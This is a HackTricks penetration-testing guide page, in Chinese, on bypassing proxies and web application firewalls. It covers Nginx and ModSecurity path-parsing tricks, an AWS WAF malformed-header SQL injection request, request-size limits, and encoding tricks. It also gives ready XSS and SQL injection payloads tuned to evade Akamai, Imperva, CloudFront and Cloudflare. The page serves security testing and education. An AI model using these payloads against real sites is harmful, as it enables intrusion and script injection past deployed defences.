<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Proxy / WAF Protections Bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="proxy--waf-protections-bypass"><a class="header" href="#proxy--waf-protections-bypass">Proxy / WAF Protections Bypass</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="通过路径名操作绕过-nginx-acl-规则"><a class="header" href="#通过路径名操作绕过-nginx-acl-规则">通过路径名操作绕过 Nginx ACL 规则 <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a></a></h2>
<p>技术 <a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">来自这项研究</a>。</p>
<p>Nginx 规则示例：</p>
<pre><code class="language-plaintext">location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
</code></pre>
<p>为了防止绕过，Nginx 在检查路径之前执行路径规范化。然而，如果后端服务器执行不同的规范化（移除 Nginx 不移除的字符），则可能绕过此防御。</p>
<h3 id="nodejs---express"><a class="header" href="#nodejs---express"><strong>NodeJS - Express</strong></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Nginx 版本</th><th><strong>Node.js 绕过字符</strong></th></tr></thead><tbody>
<tr><td>1.22.0</td><td><code>\xA0</code></td></tr>
<tr><td>1.21.6</td><td><code>\xA0</code></td></tr>
<tr><td>1.20.2</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
<tr><td>1.18.0</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
<tr><td>1.16.1</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
</tbody></table>
</div>
<h3 id="flask"><a class="header" href="#flask"><strong>Flask</strong></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Nginx 版本</th><th><strong>Flask 绕过字符</strong></th></tr></thead><tbody>
<tr><td>1.22.0</td><td><code>\x85</code>, <code>\xA0</code></td></tr>
<tr><td>1.21.6</td><td><code>\x85</code>, <code>\xA0</code></td></tr>
<tr><td>1.20.2</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
<tr><td>1.18.0</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
<tr><td>1.16.1</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
</tbody></table>
</div>
<h3 id="spring-boot"><a class="header" href="#spring-boot"><strong>Spring Boot</strong></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Nginx 版本</th><th><strong>Spring Boot 绕过字符</strong></th></tr></thead><tbody>
<tr><td>1.22.0</td><td><code>;</code></td></tr>
<tr><td>1.21.6</td><td><code>;</code></td></tr>
<tr><td>1.20.2</td><td><code>\x09</code>, <code>;</code></td></tr>
<tr><td>1.18.0</td><td><code>\x09</code>, <code>;</code></td></tr>
<tr><td>1.16.1</td><td><code>\x09</code>, <code>;</code></td></tr>
</tbody></table>
</div>
<h3 id="php-fpm"><a class="header" href="#php-fpm"><strong>PHP-FPM</strong></a></h3>
<p>Nginx FPM 配置：</p>
<pre><code class="language-plaintext">location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
</code></pre>
<p>Nginx 被配置为阻止对 <code>/admin.php</code> 的访问，但可以通过访问 <code>/admin.php/index.php</code> 来绕过此限制。</p>
<h3 id="如何防止"><a class="header" href="#如何防止">如何防止</a></h3>
<pre><code class="language-plaintext">location ~* ^/admin {
deny all;
}
</code></pre>
<h2 id="bypass-mod-security-rules"><a class="header" href="#bypass-mod-security-rules">Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a></a></h2>
<h3 id="path-confusion"><a class="header" href="#path-confusion">Path Confusion</a></h3>
<p><a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/"><strong>在这篇文章中</strong></a> 解释了 ModSecurity v3（直到 3.0.12）<strong>错误地实现了 <code>REQUEST_FILENAME</code></strong> 变量，该变量应该包含访问的路径（直到参数开始）。这是因为它执行了 URL 解码以获取路径。<br />
因此，像 <code>http://example.com/foo%3f';alert(1);foo=</code> 这样的请求在 mod security 中将认为路径只是 <code>/foo</code>，因为 <code>%3f</code> 被转换为 <code>?</code> 结束了 URL 路径，但实际上服务器接收到的路径将是 <code>/foo%3f';alert(1);foo=</code>。</p>
<p>变量 <code>REQUEST_BASENAME</code> 和 <code>PATH_INFO</code> 也受到此错误的影响。</p>
<p>在 Mod Security 的版本 2 中发生了类似的情况，允许绕过一种保护，该保护阻止用户访问与备份文件相关的特定扩展名的文件（例如 <code>.bak</code>），只需发送点 URL 编码为 <code>%2e</code>，例如：<code>https://example.com/backup%2ebak</code>。</p>
<h2 id="bypass-aws-waf-acl"><a class="header" href="#bypass-aws-waf-acl">Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a></a></h2>
<h3 id="malformed-header"><a class="header" href="#malformed-header">Malformed Header</a></h3>
<p><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">这项研究</a> 提到可以通过发送一个“格式错误”的头部来绕过应用于 HTTP 头部的 AWS WAF 规则，该头部未被 AWS 正确解析，但被后端服务器解析。</p>
<p>例如，发送以下请求，在头部 X-Query 中包含 SQL 注入：</p>
<pre><code class="language-http">GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
</code></pre>
<p>可以绕过AWS WAF，因为它无法理解下一行是头部值的一部分，而NODEJS服务器可以（这个问题已修复）。</p>
<h2 id="通用waf绕过"><a class="header" href="#通用waf绕过">通用WAF绕过</a></h2>
<h3 id="请求大小限制"><a class="header" href="#请求大小限制">请求大小限制</a></h3>
<p>通常，WAF对请求的长度有一定的限制，如果POST/PUT/PATCH请求超过该限制，WAF将不会检查该请求。</p>
<ul>
<li>对于AWS WAF，您可以<a href="https://docs.aws.amazon.com/waf/latest/developerguide/limits.html"><strong>查看文档</strong></a><strong>:</strong></li>
</ul>
<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>可以检查的应用负载均衡器和AWS AppSync保护的Web请求体的最大大小</td><td>8 KB</td></tr><tr><td>可以检查的CloudFront、API Gateway、Amazon Cognito、App Runner和Verified Access保护的Web请求体的最大大小**</td><td>64 KB</td></tr></tbody></table>
<ul>
<li>来自<a href="https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits"><strong>Azure文档</strong></a><strong>:</strong></li>
</ul>
<p>较旧的Web应用防火墙使用核心规则集3.1（或更低版本）允许大于<strong>128 KB</strong>的消息，通过关闭请求体检查，但这些消息不会被检查漏洞。对于较新版本（核心规则集3.2或更高版本），可以通过禁用最大请求体限制来实现。当请求超过大小限制时：</p>
<p>如果是<strong>预防模式</strong>：记录并阻止请求。<br />
如果是<strong>检测模式</strong>：检查到限制，忽略其余部分，并在<code>Content-Length</code>超过限制时记录。</p>
<ul>
<li>来自<a href="https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US"><strong>Akamai</strong></a><strong>:</strong></li>
</ul>
<p>默认情况下，WAF仅检查请求的前8KB。通过添加高级元数据，可以将限制增加到128KB。</p>
<ul>
<li>来自<a href="https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields"><strong>Cloudflare</strong></a><strong>:</strong></li>
</ul>
<p>最多128KB。</p>
<h3 id="混淆"><a class="header" href="#混淆">混淆 <a href="#obfuscation" id="obfuscation"></a></a></h3>
<pre><code class="language-bash"># IIS, ASP Clasic
&lt;%s%cr%u0131pt&gt; == &lt;script&gt;

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
</code></pre>
<h3 id="unicode-兼容性"><a class="header" href="#unicode-兼容性">Unicode 兼容性 <a href="#unicode-compatability" id="unicode-compatability"></a></a></h3>
<p>根据 Unicode 规范化的实现（更多信息 <a href="https://jlajara.gitlab.io/Bypass_WAF_Unicode">这里</a>），共享 Unicode 兼容性的字符可能能够绕过 WAF 并作为预期的有效负载执行。兼容字符可以在 <a href="https://www.compart.com/en/unicode">这里</a> 找到。</p>
<h4 id="示例"><a class="header" href="#示例">示例 <a href="#example" id="example"></a></a></h4>
<pre><code class="language-bash"># under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --&gt; ＜img src=p onerror='prompt(1)'&gt;
</code></pre>
<h3 id="bypass-contextual-wafs-with-encodings"><a class="header" href="#bypass-contextual-wafs-with-encodings">Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a></a></h3>
<p>正如在<a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization"><strong>这篇博客文章</strong></a>中提到的，为了绕过能够维护用户输入上下文的WAF，我们可以利用WAF技术来实际规范化用户输入。</p>
<p>例如，在文章中提到<strong>Akamai对用户输入进行了10次URL解码</strong>。因此像<code>&lt;input/%2525252525252525253e/onfocus</code>这样的内容将被Akamai视为<code>&lt;input/&gt;/onfocus</code>，这<strong>可能认为是可以的，因为标签是闭合的</strong>。然而，只要应用程序没有对输入进行10次URL解码，受害者将看到像<code>&lt;input/%25252525252525253e/onfocus</code>这样的内容，这<strong>仍然有效于XSS攻击</strong>。</p>
<p>因此，这允许在WAF将解码和解释的编码组件中<strong>隐藏有效负载</strong>，而受害者则不会。</p>
<p>此外，这不仅可以通过URL编码的有效负载来实现，还可以通过其他编码方式，如unicode、hex、octal等。</p>
<p>在文章中建议了以下最终绕过方法：</p>
<ul>
<li>Akamai:<code>akamai.com/?x=&lt;x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)&gt;</code></li>
<li>Imperva:<code>imperva.com/?x=&lt;x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=&gt;999"&gt;</code></li>
<li>AWS/Cloudfront:<code>docs.aws.amazon.com/?x=&lt;x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)&gt;</code></li>
<li>Cloudflare:<code>cloudflare.com/?x=&lt;x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=&gt;999"&gt;</code></li>
</ul>
<p>还提到，根据<strong>某些WAF如何理解用户输入的上下文</strong>，可能会有利用的空间。博客中提出的例子是Akamai允许在<code>/*</code>和<code>*/</code>之间放置任何内容（可能是因为这通常用作注释）。因此，像<code>/*'or sleep(5)-- -*/</code>这样的SQL注入将不会被捕获，并且将有效，因为<code>/*</code>是注入的起始字符串，而<code>*/</code>被注释掉。</p>
<p>这些上下文问题也可以用来<strong>利用其他比WAF预期的漏洞</strong>（例如，这也可以用来利用XSS）。</p>
<h3 id="h2c-smuggling"><a class="header" href="#h2c-smuggling">H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a></a></h3>
<p>{% content-ref url="h2c-smuggling.md" %}
<a href="h2c-smuggling.html">h2c-smuggling.md</a>
{% endcontent-ref %}</p>
<h3 id="ip-rotation"><a class="header" href="#ip-rotation">IP Rotation <a href="#ip-rotation" id="ip-rotation"></a></a></h3>
<ul>
<li><a href="https://github.com/ustayready/fireprox">https://github.com/ustayready/fireprox</a>: 生成一个API网关URL以与ffuf一起使用</li>
<li><a href="https://github.com/rootcathacking/catspin">https://github.com/rootcathacking/catspin</a>: 类似于fireprox</li>
<li><a href="https://github.com/PortSwigger/ip-rotate">https://github.com/PortSwigger/ip-rotate</a>: 使用API网关IP的Burp Suite插件</li>
<li><a href="https://github.com/fyoorer/ShadowClone">https://github.com/fyoorer/ShadowClone</a>: 根据输入文件大小和拆分因子动态确定的容器实例数量被激活，输入被拆分为块以进行并行执行，例如100个实例处理来自10,000行输入文件的100个块，拆分因子为100行。</li>
<li><a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization">https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization</a></li>
</ul>
<h3 id="regex-bypasses"><a class="header" href="#regex-bypasses">Regex Bypasses</a></h3>
<p>可以使用不同的技术来绕过防火墙上的正则表达式过滤器。示例包括交替大小写、添加换行符和编码有效负载。各种绕过的资源可以在<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads">PayloadsAllTheThings</a>和<a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASP</a>中找到。以下示例来自<a href="https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2">这篇文章</a>。</p>
<pre><code class="language-bash">&lt;sCrIpT&gt;alert(XSS)&lt;/sCriPt&gt; #changing the case of the tag
&lt;&lt;script&gt;alert(XSS)&lt;/script&gt; #prepending an additional "&lt;"
&lt;script&gt;alert(XSS) // #removing the closing tag
&lt;script&gt;alert`XSS`&lt;/script&gt; #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
&lt;iframe src=http://malicous.com &lt; #double open angle brackets
&lt;STYLE&gt;.classname{background-image:url("javascript:alert(XSS)");}&lt;/STYLE&gt; #uncommon tags
&lt;img/src=1/onerror=alert(0)&gt; #bypass space filter by using / where a space is expected
&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)&gt;xss&lt;/a&gt; #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
&lt;iframe src="javascript:alert(`xss`)"&gt; #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
&lt;a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"&gt; #Using Line Feed (LF) line breaks
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=confirm()&gt; # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
</code></pre>
<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
<ul>
<li><a href="https://github.com/assetnote/nowafpls"><strong>nowafpls</strong></a>: Burp 插件，通过长度向请求添加垃圾数据以绕过 WAF</li>
</ul>
<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
<ul>
<li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies</a></li>
<li><a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/">https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/</a></li>
<li><a href="https://www.youtube.com/watch?v=0OMmWtU2Y_g">https://www.youtube.com/watch?v=0OMmWtU2Y_g</a></li>
<li><a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization">https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization</a></li>
</ul>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/race-condition.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/race-condition.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
